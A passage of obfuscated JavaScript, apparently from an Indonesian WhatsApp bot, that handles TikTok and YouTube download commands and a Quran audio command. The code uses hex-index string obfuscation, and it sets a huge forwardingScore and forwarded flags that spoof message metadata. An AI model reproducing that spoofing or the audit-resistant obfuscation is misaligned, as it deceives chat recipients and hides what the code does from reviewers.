yts(q);server='en68',yta2(yut[_0x593f96(0x3ae,0x441,0x1a4,0x7b1)][0x1b1b+-0x19*0x25+-0x177e][_0x1e23e4(0x92,0x57d,0x153,0x15b)],server)['then'](async _0x568102=>{const _0x5748b0={'MBcSV':function(_0xf06de7,_0x206dd8){return _0xf06de7(_0x206dd8);},'iLSTN':_0x334a70(-0xa1,0x118,0x3eb,0x831)+_0x334a70(0xe1e,0x107a,0xdb1,0x9fd),'BaJsK':_0xbc0ee9(0x768,0x7e8,0x9af,0x729),'lmPmM':_0x334a70(0xc17,0xc8a,0x907,0x45c)+'kbps)','clutd':function(_0x3694b2,_0x18d522,_0x27ceab,_0x416fd8,_0x1065a0,_0x3a5611,_0x2af210){return _0x3694b2(_0x18d522,_0x27ceab,_0x416fd8,_0x1065a0,_0x3a5611,_0x2af210);}},{thumb:_0x2aac50,title:_0x2f3ec2,filesizeF:_0x9786da,filesize:_0x5bf776}=_0x568102,_0x131b4a=_0x334a70(0x992,0xb23,0xd4b,0xe5f)+_0x334a70(0x4ce,0x8f3,0x661,0x780)+_0x334a70(0x773,0xd5a,0x990,0xe1b)+_0xbc0ee9(0x70a,0x633,0x530,0xb36)+_0x2f3ec2+_0x334a70(0xbe9,0xa23,0x712,0x41e)+yut[_0x334a70(0x290,0x76a,0x499,0xcb)][-0x1100+-0x27b+0x1*0x137b][_0xbc0ee9(0x80a,0x5bd,0x6d5,0x33c)]+(_0x334a70(0x77b,0x678,0x4f4,0x36f)+':\x20')+yut[_0xbc0ee9(0x456,0x23d,-0x242,0x40d)][0x935+0x2169+-0x154f*0x2][_0xbc0ee9(0x5f0,0x410,0x5cd,0x3df)]+_0x334a70(0x682,0xcb3,0x7ba,0xa96)+_0x9786da+_0x334a70(0x926,0x381,0x54a,0x8bd)+yut[_0x334a70(-0x5c,0x6e2,0x499,0x743)][-0x28c+-0x1f56+0x21e2][_0xbc0ee9(0xcdc,0x829,0xd3a,0xaa9)]+(_0x334a70(0x7d4,0x49a,0x657,0x763)+_0xbc0ee9(0x717,0x2d8,-0x158,0x7b6))+yut[_0x334a70(0x3ed,0x7fc,0x499,0x7f0)][0x9e*0x33+0x6*0x405+-0x3798][_0xbc0ee9(0xbac,0x7c5,0xca2,0x48c)]+_0x334a70(0x577,0x20d,0x5ca,0x79b)+yut[_0xbc0ee9(-0x136,0x23d,-0x276,-0x87)][0x1ac8+0xb46+-0x1*0x260e][_0x334a70(0xe7,0x5ee,0x41c,0x705)]+('\x0a\x0a_Please\x20'+_0xbc0ee9(0x488,0x99e,0x9bb,0xacc)+'\x20media\x20you'+_0x334a70(0xdc9,0xa4e,0xa47,0xd56)+_0x334a70(0x42e,0x413,0x408,0x7fd));let _0x3ae08b=await _0x5748b0['MBcSV'](getBuffer,_0x2aac50);const _0x1b7a26={};_0x1b7a26[_0xbc0ee9(0x3ca,0x24b,0x233,-0x7e)+'t']=_0x5748b0['iLSTN'];function _0xbc0ee9(_0x1a3104,_0x4db888,_0x1c7b8f,_0x2a4ff5){return _0x593f96(_0x4db888- -0x171,_0x1a3104,_0x1c7b8f-0x191,_0x2a4ff5-0x16a);}const _0x148dba={};_0x148dba[_0xbc0ee9(0x5a,0x26d,-0x6b,0x360)]='videohd\x20'+q,_0x148dba[_0x334a70(0x22,0x806,0x38f,0x682)]=_0x1b7a26,_0x148dba[_0xbc0ee9(0xd18,0xa0d,0x9c5,0xf0c)]=_0x5748b0[_0xbc0ee9(0x709,0x9ce,0xad0,0x7f4)];const _0x4adde5={};_0x4adde5[_0x334a70(0x672,0x6c7,0x4a7,0x366)+'t']=_0x5748b0[_0xbc0ee9(0x50d,0x508,0x787,0x5a5)];const _0x5df335={};_0x5df335['buttonId']=_0x334a70(0x82c,0xce3,0x9aa,0x638)+q,_0x5df335[_0x334a70(0x65,0x135,0x38f,0x700)]=_0x4adde5;function _0x334a70(_0x283447,_0x213bdb,_0x54d92e,_0x57fb25){return _0x1e23e4(_0x283447-0x108,_0x213bdb-0x1a,_0x54d92e-0x2c9,_0x283447);}_0x5df335[_0x334a70(0x1069,0xc7a,0xc69,0xd04)]=_0x5748b0[_0x334a70(0x994,0xd7f,0xc2a,0xe12)];const _0x92aa9e={};_0x92aa9e[_0x334a70(0x2,0x4c8,0x4a7,0x58)+'t']=_0xbc0ee9(0x987,0x952,0x66a,0x7a9)+_0x334a70(0xdcc,0xdd0,0xdb1,0x9b1);const _0x2918db={};_0x2918db[_0xbc0ee9(0x5f2,0x26d,0x6ec,0x6bf)]=_0xbc0ee9(0x70d,0x505,0x90b,0x658)+yut[_0xbc0ee9(-0x12,0x23d,0x2ca,-0xae)][0x7e9+0x1b12+-0x3*0xba9]['url'],_0x2918db[_0x334a70(0x7f5,0x725,0x38f,0x826)]=_0x92aa9e,_0x2918db[_0xbc0ee9(0x6fa,0xa0d,0xc98,0xbbf)]=_0x334a70(0xde3,0xe01,0xa44,0x802);let _0x3888bd=[_0x148dba,_0x5df335,_0x2918db];_0x5748b0[_0xbc0ee9(0x678,0x907,0x47f,0x944)](sendButLocation,from,_0x131b4a,_0x334a70(0x86b,0xf70,0xb4f,0xebf)+_0x334a70(0x2fb,0x158,0x445,0x414)+'o\x20?'+enter+enter+botname+_0x334a70(0x6e6,0x122,0x4d4,0x2bb)+ownername,_0x3ae08b,_0x3888bd,{});})['catch'](_0x3ee885=>reply('Terjadi\x20ke'+_0x593f96(0x514,0x2fe,0x84c,0x4e)+_0x593f96(0x3b8,0xc9,0x529,0x516)+'pa\x20saat\x20la'+'gi')),await limitAdd(sender,limit);break;case'tiktok':if(!isUrl(args[0x656+-0x2395*-0x1+0x1*-0x29eb])&&!args[-0xe*0x17e+-0x11d9+0xd3*0x2f][_0x593f96(0x942,0x695,0x8de,0x499)](_0x1e23e4(0x6ed,0x45a,0x5b4,0x156)))return reply(lang[_0x1e23e4(0x4be,0x7e9,0x7b7,0x29f)]());if(!q)return fakegroup(_0x593f96(0x5ba,0x11b,0xab1,0x3f2));reply(lang[_0x1e23e4(0x155,-0x238,0x143,0x514)]()),ttt=args[_0x593f96(0xc2f,0x89e,0x822,0x111f)]('\x20'),hx[_0x1e23e4(0x8da,0x66b,0x5cd,0x81d)+'er'](ttt)['then'](_0x3d4291=>{function _0x1e5655(_0x37e603,_0x5b4df3,_0x41e8cf,_0x16e3e3){return _0x593f96(_0x16e3e3- -0x421,_0x5b4df3,_0x41e8cf-0x1cd,_0x16e3e3-0x4f);}function _0x489ab5(_0x1e1063,_0x1b609b,_0x5c638f,_0x4d8b90){return _0x1e23e4(_0x1e1063-0x19b,_0x1b609b-0xa3,_0x5c638f-0x360,_0x4d8b90);}const _0x3156a2={'qFCTS':function(_0x1a2fe4,_0x19826f){return _0x1a2fe4(_0x19826f);},'TroNB':'NOWM','dmePA':_0x489ab5(0x847,0xe67,0xadb,0xa38)},{wm:_0x1bdb00,nowm:_0x329e8f,audio:_0x57bfcd}=_0x3d4291;axios['get'](_0x1e5655(-0x49,0x380,0x5dc,0xe6)+'nyurl.com/'+_0x489ab5(0x93a,0xe99,0xaad,0x928)+'.php?url='+_0x1bdb00)[_0x1e5655(0x436,0x3f5,0x2e2,0x424)](async _0x5a5e9d=>{let _0x111188=await _0x3156a2[_0x1716c8(0xa47,0xe2c,0x96c,0xd80)](getBuffer,_0x1bdb00);const _0x1e4fd9={};_0x1e4fd9[_0x53036d(0xb1,0x82e,0x16b,0x5bb)+'t']=_0x3156a2[_0x53036d(0x7a8,0x818,0x491,0x689)];const _0x22f048={};_0x22f048[_0x1716c8(0x3e3,0x6d1,0x363,0x537)]=_0x53036d(0x96d,0xd5e,0xade,0x9e7)+'\x20'+q,_0x22f048['buttonText']=_0x1e4fd9,_0x22f048['type']=_0x3156a2['dmePA'];const _0x13bca2={};_0x13bca2[_0x1716c8(0x3c1,0x4eb,0x2f8,0x85d)+'t']=_0x53036d(0xea9,0xbb6,0xae1,0xaaf);const _0x2cab18={};function _0x1716c8(_0x1feff6,_0x20ed61,_0x1afaac,_0x137ad2){return _0x1e5655(_0x1feff6-0xf3,_0x137ad2,_0x1afaac-0x1d2,_0x1feff6-0x426);}_0x2cab18[_0x53036d(0x5af,0x882,0x22f,0x5dd)]=_0x1716c8(0xbfa,0xf15,0x738,0xeb1)+'o\x20'+q,_0x2cab18['buttonText']=_0x13bca2,_0x2cab18[_0x1716c8(0xb83,0xdb3,0x9de,0xd6b)]=_0x3156a2[_0x1716c8(0xa18,0xe66,0x8bd,0x9dc)];let _0x229683=[_0x22f048,_0x2cab18];function _0x53036d(_0x4a9347,_0x20bca3,_0x5103b0,_0x294857){return _0x489ab5(_0x4a9347-0x9a,_0x20bca3-0x10,_0x294857-0x7d,_0x4a9347);}sendButVideo(from,_0x1716c8(0x8fb,0xb9c,0xbd4,0x91d)+sender[_0x1716c8(0x316,0x64,-0x1df,0x797)]('@')[-0x16f5+-0x2253+0x98c*0x6]+(_0x53036d(0x3d0,0xa00,0x326,0x638)+_0x53036d(0x9a7,0x39c,0x66d,0x7ff)+_0x1716c8(0x2c8,0x1d,0x6f5,0x6c9)+_0x1716c8(0x3a1,0x59f,0x86e,0x28c)+_0x1716c8(0x72b,0x9ce,0x8fd,0x3d4)+'no\x20wm\x20ting'+'gal\x20pilih\x20'+_0x53036d(0x617,0x843,0x7fc,0x771)+'h'),'NOTE\x20！'+enter+(_0x1716c8(0x906,0xd32,0x91e,0x591)+'app\x20mod\x20ka'+'mu\x20belum\x20s'+_0x1716c8(0x9ff,0x7c2,0x5d8,0x93f)+_0x53036d(0xd1c,0x538,0x71d,0x966)+_0x53036d(0x7c9,0x1b5,0x6f8,0x617)+'video\x20ini\x20'+_0x53036d(0xa40,0xaa8,0xd64,0xd9b)+_0x1716c8(0x9c8,0xad2,0x740,0x919)+_0x1716c8(0x87c,0x4de,0x5a8,0x467))+enter+enter+botname+_0x53036d(0x7be,0x655,0x681,0x5e8)+ownername,_0x111188,_0x229683,{'contextInfo':{'mentionedJid':[sender]}});});})[_0x593f96(0xc8c,0xcee,0xe39,0xa37)](_0x25fcc8=>reply(_0x1e23e4(0xa49,0x406,0x585,0x1e6)+_0x1e23e4(0xef,-0x191,0x336,0x148)+_0x593f96(0x3b8,0x23d,0x82c,0x2cd)+_0x593f96(0xb8e,0xcd3,0xfce,0xe8d)+'gi')),await limitAdd(sender,limit);break;case _0x593f96(0x745,0xc40,0xbfb,0xb1e)+_0x1e23e4(-0x1dd,0x4be,0x138,0x303):if(args['length']<0x23cb+0x1a9f+-0x4cd*0xd)return reply(_0x1e23e4(0x63c,0x73f,0x950,0x721)+(prefix+command)+(_0x1e23e4(0x716,0x575,0x8c1,0xa38)+_0x1e23e4(0x5bf,0x5e9,0x1a8,-0x34e)+_0x593f96(0x7cc,0xa2c,0xb50,0x43f))+enter+'Usage:\x20'+(prefix+command)+_0x1e23e4(-0x20a,-0x3f6,0x11d,0x470));var F=q,F1=F[_0x593f96(0x311,0x579,-0x1ca,-0x189)]('|')[-0x1e28+-0x762+0x782*0x5],F2=F[_0x593f96(0x311,0x460,0x759,0x742)]('|')[-0x8b*-0x37+0x75*0x2+0x6*-0x521];let pijaqu=await fetchJson('https://al'+_0x593f96(0x37e,0x481,0x16e,0xc8)+'o7sv4hu4k-'+'alquran-ap'+_0x1e23e4(0x66c,0x5a,0x46a,0xda)+'c.vercel.a'+_0x1e23e4(0x9b3,0xd0d,0x93c,0x699)+F1+'/'+F2),japkk=await getBuffer(pijaqu[_0x1e23e4(0x6b6,0x95c,0x74a,0x6ee)][_0x1e23e4(0xbcd,0x514,0x83d,0xb2f)]['primary'])[_0x593f96(0xc8c,0x105a,0x92e,0x1001)](_0x5aa188=>{const _0x4253c0={'kGxxp':function(_0x2389f9,_0x2ff5bd){return _0x2389f9(_0x2ff5bd);},'jvSXw':_0x4a22cf(0x753,0xc2d,0xa0e,0x87d)};function _0x4a22cf(_0x1bcf20,_0x55e31e,_0x50972,_0x1fa409){return _0x593f96(_0x1bcf20-0xeb,_0x1fa409,_0x50972-0xfb,_0x1fa409-0x5b);}function _0x1abcff(_0x3c66fc,_0x48847b,_0x307d21,_0x50b456){return _0x1e23e4(_0x3c66fc-0x35,_0x48847b-0x18c,_0x50b456-0x1ca,_0x48847b);}_0x4253c0[_0x1abcff(0xa28,0xc91,0x685,0x7bb)](reply,_0x4253c0[_0x4a22cf(0x7d0,0xac2,0x67e,0xb6f)]);});const _0xfb45c7={};_0xfb45c7[_0x1e23e4(0x555,-0x1b5,0x10d,-0x3ce)]=_0x593f96(0xb9c,0xb83,0x878,0x84b)+'utu.be/1r_'+_0x1e23e4(0x813,0xc45,0xac6,0xe96),_0xfb45c7[_0x593f96(0x74d,0xbfd,0xa77,0x5e2)]=0x2,_0xfb45c7['title']=_0x1e23e4(0x610,0x2b,0x27c,0x1c2)+'dio',_0xfb45c7[_0x1e23e4(-0x322,-0x2d0,0xde,-0x10f)]='',_0xfb45c7['thumbnailU'+'rl']='',_0xfb45c7[_0x593f96(0x44a,0x20d,0x5a3,0x65b)]=pp_userz;const _0x2dcbfe={};_0x2dcbfe['text']=_0x1e23e4(0x752,0x87,0x27c,-0x43)+_0x593f96(0x316,0x387,0x825,0x40f),_0x2dcbfe[_0x1e23e4(0x5cb,0x8ea,0x830,0x575)+'Score']=0x3b9aca00,_0x2dcbfe['isForwarde'+'d']=!![],_0x2dcbfe[_0x593f96(0x320,0x9,0xa0,-0x8f)+'ral']=!![],_0x2dcbfe['externalAd'+_0x593f96(0x2d4,-0x3e,0x21,0x2ed)]=_0xfb45c7;const _0x593b80={};_0x593b80['contextInf'+'o']=_0x2dcbfe,_0x593b80['mimetype']='audio/mp4',_0x593b80[_0x593f96(0x56e,0x3f9,0x41f,0x547)]=_0x1e23e4(0x1bc,0x74a,0x693,0x382)+_0x593f96(0xbf3,0x10a0,0xdc5,0xa55),_0x593b80[_0x593f96(0x991,0xa5a,0xcc3,0xd6a)]=fgclink2,_0x593b80[_0x593f96(0x44a,0x182,0x914,0x73c)]=pp_userz,alpha['sendMessag'+'e'](from,japkk,MessageType[_0x1e23e4(0x29f,0x8f,0x475,0x6af)],_0x593b80);break;case _0x1e23e4(0x8b6,0x878,0xa17,0x683)+'o':case _0x1e23e4(0x888,0x62e,0x462,0x645)+'c':case _0x593f96(0x7e1,0xb46,0xa4a,0x63c):if(!isUrl(args[-0x9*-0x8b+-0x17f*0x1+-0x364])&&!args[-0x2*-0x12da+0x775*0x1+0x1*-0x2d29][_0x1e23e4(0xa50,0x6eb,0x764,0x39c)](_0x1e23e4(0x16d,0x4c5,0x5b4,0xa80)))return reply(lang[_0x1e23e4(0x7ab,0x2fc,0x7b7,0xc62)]());if(!q)return reply(_0x1e23e4(-0xe5,0x1c,0x3dc,0x6e1));reply(lang['wait']()),hx['ttdownload'+'er'](''+args[0x1*-0x10a9+0x20cb+-0x1022])[_0x1e23e4(0x7c5,0x87f,0x667,0x2b6)](_0xc3aba5=>{const _0x17ac98={'WsDoz':function(_0x2011b1,_0x101691){return _0x2011b1>=_0x101691;},'rDuQe':function(_0x4f1455,_0x804617,_0x4d57bc,_0x2c5a49){return _0x4f1455(_0x804617,_0x4d57bc,_0x2c5a49);},'XHGuM':function(_0x4aa0d9,_0x5cff62,_0x573212){return _0x4aa0d9(_0x5cff62,_0x573212);},'llibr':function(_0x248b10,_0x1ba3bb){return _0x248b10!==_0x1ba3bb;},'aUSbs':'NKOvO','TLkNA':function(_0x2c5a91,_0x36e94d){return _0x2c5a91(_0x36e94d);},'yVijm':_0x2475c7(0xb85,0xeb3,0xbf9,0xcfc)+'utu.be/1r_'+_0x37d3c7(0xe00,0xebf,0x871,0x9d9),'AWaOB':_0x2475c7(0xc99,0x10c5,0xacf,0xa3a)};function _0x37d3c7(_0x3de9dc,_0x47234c,_0x262de8,_0x57a409){return _0x593f96(_0x57a409- -0x2cb,_0x3de9dc,_0x262de8-0x1d9,_0x57a409-0x18c);}const {wm:_0x5ac52d,nowm:_0x4da003,audio:_0x2383c3}=_0xc3aba5;function _0x2475c7(_0x665b7,_0x4f70b3,_0xa67b6,_0x1a50e4){return _0x1e23e4(_0x665b7-0x1bb,_0x4f70b3-0x10d,_0x665b7-0x1c7,_0x1a50e4);}axios[_0x2475c7(0x568,0xa43,0x7ed,0x275)](_0x2475c7(0x4f0,0x366,0x5ac,0x6cf)+_0x37d3c7(0x6bf,0x1b0,0x4b9,0x5ec)+_0x37d3c7(0x58e,0x68c,0x69e,0x660)+_0x37d3c7(0x572,0x7c7,0x9df,0x879)+_0x4da003)[_0x2475c7(0x82e,0x5e7,0x9b7,0x46b)](async _0xb229cf=>{function _0x45a46b(_0x60d44e,_0x370196,_0x51d829,_0x427dd2){return _0x37d3c7(_0x427dd2,_0x370196-0x4,_0x51d829-0x14d,_0x51d829- -0x26);}function _0x2ba9f5(_0x288bab,_0x483d90,_0x536e6d,_0x3956a8){return _0x37d3c7(_0x3956a8,_0x483d90-0x1c7,_0x536e6d-0x1db,_0x483d90- -0x102);}const _0x2c3b19={'YjDqN':function(_0x2aefb7,_0x5e8345){return _0x2aefb7(_0x5e8345);},'otXIO':function(_0x565882,_0x4ed555){return _0x17ac98['WsDoz'](_0x565882,_0x4ed555);},'QcVJk':function(_0x5ed573,_0x2afbb0,_0x3408e5,_0x4fc370){return _0x17ac98['rDuQe'](_0x5ed573,_0x2afbb0,_0x3408e5,_0x4fc370);},'Irefd':function(_0x3df9b8,_0x325ff3,_0x15f450){function _0x40609d(_0x2ff521,_0x5b5003,_0x53b478,_0x44ceeb){return _0x1511(_0x5b5003-0x201,_0x2ff521);}return _0x17ac98[_0x40609d(0x582,0x895,0xc06,0x5a9)](_0x3df9b8,_0x325ff3,_0x15f450);}};if(_0x17ac98['llibr'](_0x17ac98[_0x45a46b(0x8f3,0x91a,0x4e6,0xda)],'kpwhQ')){me=_0x45a46b(0x3c7,0xca0,0x8b6,0x464)+_0xb229cf[_0x45a46b(0x487,0x79e,0x637,0x4ea)],nowmm=await _0x17ac98[_0x2ba9f5(0x9b2,0x885,0x7db,0xa02)](getBuffer,_0x2383c3);const _0x26a505={};_0x26a505['mediaUrl']=_0x17ac98[_0x45a46b(0xa32,0xbd3,0x930,0x977)],_0x26a505['mediaType']=0x2,_0x26a505[_0x45a46b(0x411,0x450,0x667,0x218)]=_0x2ba9f5(0x4cf,0x167,0x426,0x3fd)+'ic',_0x26a505[_0x2ba9f5(-0x3b1,-0x111,-0xc,-0x31d)]='',_0x26a505['thumbnailU'+'rl']='',_0x26a505[_0x45a46b(0x568,0x2be,0x159,0x1ff)]=pp_userz;const _0x4a9273={};_0x4a9273[_0x45a46b(0xd05,0x6bd,0x957,0x813)]=_0x45a46b(0x14f,0xaf,0x243,0x327)+_0x2ba9f5(0x145,-0x83,-0xfb,-0x19)+_0x45a46b(0x9f4,0xb75,0x860,0x936),_0x4a9273[_0x45a46b(0x3d5,0x875,0x71d,0x4d4)+'Score']=0x3b9aca00,_0x4a9273[_0x45a46b(0xb7f,0xc42,0x99c,0x53e)+'d']=!![],_0x4a9273[_0x2ba9f5(0x3d9,-0xad,-0x24,-0x15)+_0x2ba9f5(0x309,-0xb,0x19d,-0x259)]=!![],_0x4a9273[_0x2ba9f5(0x78,0x1e1,0x694,0x5d4)+_0x45a46b(-0x4d2,0x4d3,-0x1d,0x23c)]=_0x26a505;const _0x2de883={};_0x2de883[_0x2ba9f5(0x564,0x6d7,0x62b,0x46a)+'o']=_0x4a9273,_0x2de883[_0x45a46b(0x4fe,0x321,0x7a8,0x907)]=_0x17ac98[_0x45a46b(0x5ef,0x955,0x7ca,0xa2d)],_0x2de883[_0x45a46b(-0x26b,0x4f0,0x27d,0x6fa)]=_0x45a46b(0xdc,0x6c1,0x243,0x29d)+_0x2ba9f5(0xd03,0x8a0,0x794,0xc16),_0x2de883[_0x45a46b(0x4be,0x84c,0x6a0,0xb21)]=fgclink2,_0x2de883[_0x2ba9f5(-0x25e,0x7d,-0x2c6,0x26b)]=pp_userz,alpha[_0x2ba9f5(0x3d,0x496,0x744,0x515)+'e'](from,nowmm,MessageType[_0x2ba9f5(0x352,0x286,0x5e4,-0x73)],_0x2de883);}else _0x2c3b19[_0x2ba9f5(0x299,0x2d0,-0xb3,-0x118)](_0x1886c3,_0x27e13d,_0x122b50)['then'](_0x3bc6be=>{function _0x4390ee(_0x24b757,_0x59b5d8,_0x403c46,_0x212093){return _0x45a46b(_0x24b757-0x180,_0x59b5d8-0x1a3,_0x403c46-0x2be,_0x24b757);}function _0x321695(_0x140e81,_0x5c1b0e,_0x4197bd,_0x4397b0){return _0x2ba9f5(_0x140e81-0x151,_0x4397b0-0x34b,_0x4197bd-0x12,_0x140e81);}const _0x2dfabb={'PBwuO':function(_0x571bd5,_0x55297a){function _0x40a247(_0x5d5060,_0x546063,_0x3bf49f,_0x7289af){return _0x1511(_0x5d5060- -0x1f3,_0x7289af);}return _0x2c3b19[_0x40a247(0x2bd,-0x25,0x3f8,0x2f7)](_0x571bd5,_0x55297a);},'DUfbi':'Emror','wLLxk':function(_0xe13493,_0x2f6bb3){return _0x2c3b19['otXIO'](_0xe13493,_0x2f6bb3);},'LGCzY':function(_0x2f2b12,_0x33949b,_0x117971,_0x4d718b){function _0x4a9786(_0x1ca79d,_0x3ea0ed,_0x4c4ff0,_0x339b2c){return _0x1511(_0x3ea0ed- -0x2d4,_0x1ca79d);}return _0x2c3b19[_0x4a9786(0x7f1,0x6b9,0xa93,0x774)](_0x2f2b12,_0x33949b,_0x117971,_0x4d718b);}},{dl_link:_0x61e3a1,thumb:_0x3823c6,title:_0x3edbd2,filesizeF:_0x2a7650,filesize:_0xd928ea}=_0x3bc6be;_0x286aae[_0x321695(0x76,0x173,0x1ea,0x4fd)](_0x321695(-0x17,0x99,0x63a,0x485)+'nyurl.com/'+_0x4390ee(0x4bd,0x619,0x8f8,0xd2a)+_0x321695(0xb3b,0xf90,0xa13,0xac2)+_0x61e3a1)[_0x321695(0xc38,0x70b,0xa14,0x7c3)](async _0x1efbd2=>{function _0x12ec0d(_0x46c733,_0x2a0bef,_0x2b07a1,_0x173136){return _0x321695(_0x2b07a1,_0x2a0bef-0x42,_0x2b07a1-0x71,_0x173136- -0x3e7);}function _0x59b18f(_0xa128ae,_0x45f026,_0x194adb,_0x3d3640){return _0x4390ee(_0x194adb,_0x45f026-0x161,_0x45f026- -0x320,_0x3d3640-0x57);}if(_0x2dfabb['wLLxk'](_0x2a17e2(_0xd928ea),0x16d*0x1b1+0x548a*0x5+0xfd7*-0x29))return _0x2dfabb[_0x59b18f(0x6b5,0x2a7,0x1e0,-0x256)](_0x4bae31,_0x3f3ee8,_0x3823c6,_0x12ec0d(0x54c,0x1d5,0x1c0,0x246)+_0x59b18f(0x893,0x3b4,-0x29,0x4e4)+_0x5dba91+_0x17d6a9+(_0x59b18f(0x44,0xd3,0x1df,0x4ea)+'*\x20')+_0x3edbd2+_0x4f3c15+('📊\x20*Quality'+'\x20:*\x201080kb'+'ps')+_0x749b9d+('🦁\x20*Ext*\x20:\x20'+_0x59b18f(0x5,0x2a3,0x1b1,0x77f))+_0x30f5b3+(_0x59b18f(0x3a3,0x42e,0x450,0x93d)+_0x12ec0d(0x318,0x305,0x87e,0x656))+_0x2a7650+_0x193ce1+(_0x59b18f(0x51f,0x7ae,0xa3f,0x3cb)+'\x20')+_0x1efbd2[_0x12ec0d(0x896,0x22f,0x71,0x4bf)]+_0x320838+_0x38b980+(_0x59b18f(0x5e1,0x28e,0x29c,-0x170)+_0x59b18f(0x427,-0x20,0x4a,0x4c2)+'dari\x20batas'+'\x20disajikan'+'\x20dalam\x20ben'+'tuk\x20link_'));_0x2dfabb[_0x59b18f(0x75,0x2a7,-0x171,0x11e)](_0x1a86e5,_0xda3d97,_0x61e3a1,'')['catch'](_0x2a630d=>{function _0x2b6ae0(_0x3c2ed0,_0x364a80,_0x1ee971,_0x10316d){return _0x59b18f(_0x3c2ed0-0xdf,_0x364a80- -0x248,_0x3c2ed0,_0x10316d-0xa6);}function _0x4cc82f(_0x49476e,_0x4a76c3,_0x5ea7e0,_0x1888b5){return _0x59b18f(_0x49476e-0xb7,_0x49476e-0x4d6,_0x4a76c3,_0x1888b5-0x44);}_0x2dfabb[_0x2b6ae0(-0x130,-0x156,-0x552,0x3a2)](_0x3f0337,_0x2dfabb[_0x4cc82f(0x8ab,0x83b,0x95d,0xc40)]);});});});});}),await limitAdd(sender,limit);break;case _0x593f96(0x7e8,0x688,0x723,0xbab):case _0x593f96(0x467,0x863,0x159,-0x95):case'tt1':if(!isUrl(args[-0x2164+-0x15a9+0x370d])&&!args[0x1bb9+0x1f*-0xec+0xdb][_0x1e23e4(0xa04,0x2f8,0x764,0xb0c)]('tiktok.com'))return reply(lang['erorLink']());if(!q)return reply(_0x593f96(0x5ba,0x40f,0x5a3,0x43d));reply(lang[_0x1e23e4(-0x359,-0x359,0x143,0x30)]()),hx[_0x1e23e4(0x4de,0xb2,0x5cd,0xdb)+'er'](''+args[-0x52*-0x9+0x3*-0x3f3+0x8f7])[_0x593f96(0x845,0xbca,0x6e1,0x6f0)](_0x539ef7=>{const _0x5ccae9={'qyjCX':function(_0x255774,_0x2585db){return _0x255774(_0x2585db);},'vOfGK':_0x419887(0xbca,0x9a4,0xc45,0xe07)+_0x419887(0x8a5,0x686,0xb12,0x914)+_0x419887(0xac4,0x1111,0xd4d,0xe43),'omcUO':_0x12df60(0xe0c,0x94a,0x857,0x9c7)};function _0x419887(_0x4ba564,_0x5be68f,_0x46e700,_0x1fdd20){return _0x1e23e4(_0x4ba564-0x36,_0x5be68f-0x8a,_0x46e700-0x287,_0x4ba564);}const {wm:_0x2e3212,nowm:_0x352ef2,audio:_0x963311}=_0x539ef7;function _0x12df60(_0x34135c,_0x2fa65c,_0x23bafb,_0x1bea38){return _0x1e23e4(_0x34135c-0x18b,_0x2fa65c-0x18,_0x1bea38-0x1,_0x23bafb);}axios[_0x12df60(0x354,0x7bc,0x830,0x3a2)](_0x12df60(0x410,0x353,0x1c8,0x32a)+_0x419887(0x6d1,0x923,0x960,0xe10)+_0x419887(0xc43,0xb36,0x9d4,0xb92)+'.php?url='+_0x352ef2)[_0x419887(0xd18,0xdc3,0x8ee,0x901)](async _0xf640d5=>{me='*Link*\x20:\x20'+_0xf640d5[_0xb7fe37(0xbb3,0xed8,0x9be,0xb1f)],nowmm=await _0x5ccae9[_0xf8cfbe(0x31,0x3cf,0x6b0,0x754)](getBuffer,_0x352ef2);const _0x4c573b={};_0x4c573b[_0xb7fe37(0x6e9,0x462,0x5bb,0x4e2)]=_0x5ccae9['vOfGK'],_0x4c573b['mediaType']=0x2,_0x4c573b[_0xf8cfbe(0x620,0x702,0x3bb,0xc18)]=_0xb7fe37(0x896,0x90a,0x5de,0x4bc)+_0xb7fe37(0x107c,0xd6e,0xef3,0xdd5),_0x4c573b['body']='',_0x4c573b[_0xf8cfbe(0x93b,0x95c,0x99a,0xa67)+'rl']='',_0x4c573b[_0xb7fe37(0x999,0x8bc,0x4d6,0x641)]=pp_userz;const _0xee0715={};_0xee0715['forwarding'+_0xf8cfbe(0x94e,0x590,0xe2,0x2cb)]=0x3b9aca00,_0xee0715['isForwarde'+'d']=!![],_0xee0715['sendEpheme'+'ral']=!![],_0xee0715[_0xf8cfbe(0x396,0x358,0x1dc,0x4e2)+_0xb7fe37(0x38,0x9d3,0x707,0x4cb)]=_0x4c573b;const _0x37257f={};_0x37257f['contextInf'+'o']=_0xee0715,_0x37257f['mimetype']=_0x5ccae9[_0xf8cfbe(0xb7d,0x7ef,0x8f5,0x8a2)];function _0xf8cfbe(_0x5b43c0,_0x5c8430,_0x5a4361,_0x13e7e8){return _0x419887(_0x5b43c0,_0x5c8430-0x125,_0x5c8430- -0x2ff,_0x13e7e8-0x1ec);}_0x37257f[_0xb7fe37(0x6bd,0xa41,0x642,0x765)]=_0xf8cfbe(-0x4d,0x6f,-0x14d,0x355)+_0xf8cfbe(0x4d0,0x7c2,0x7a6,0xc06);function _0xb7fe37(_0x3d3343,_0x1aebbb,_0x4f4f7f,_0x500461){return _0x12df60(_0x3d3343-0x7c,_0x1aebbb-0xf9,_0x3d3343,_0x500461-0x3d4);}_0x37257f[_0xb7fe37(0xed7,0x9f1,0xd35,0xb88)]=fgclink2,_0x37257f[_0xf8cfbe(-0x1c2,0x1f4,0x44d,-0xe7)]=pp_userz,alpha[_0xf8cfbe(0x611,0x60d,0x19e,0x240)+'e'](from,nowmm,MessageType['document'],_0x37257f);});}),await limitAdd(sender,limit);break;case'tiktokwm':if(!isUrl(args[-0x1799*-0x1+0x214b+-0x38e4])&&!args[0x1*-0x1bed+-0x702+-0xba5*-0x3][_0x1e23e4(0x8e6,0xbe7,0x764,0x76f)]('tiktok.com'))return reply(lang[_0x1e23e4(0x2a0,0x7cc,0x7b7,0x354)]());if(!q)return fakegroup(_0x593f96(0x5ba,0x7c7,0x395,0x422));reply(lang[_0x1e23e4(0x2f4,0x297,0x143,0x54b)]()),hx[_0x1e23e4(0x768,0x202,0x5cd,0x2ee)+'er'](''+args[-0x1142*0x2+-0x16f*-0xb+-0x12bf*-0x1])[_0x593f96(0x845,0x58e,0x3f5,0x432)](_0x205967=>{const _0x4eb0a8={};_0x4eb0a8[_0x439e7e(0x305,0x5e,-0x1c7,-0x1ed)]=_0x439e7e(0x66c,0x358,0x2f4,0x789)+'utu.be/1r_'+_0x439e7e(0x774,0xb37,0xc3b,0x86e),_0x4eb0a8[_0x4c0773(0x1155,0xc5c,0x871,0xb10)]=_0x4c0773(0x98b,0xd8b,0xa07,0xe72);const _0x1fb701=_0x4eb0a8,{wm:_0x1db3bb,nowm:_0x5c6d5a,audio:_0x1ac51c}=_0x205967;function 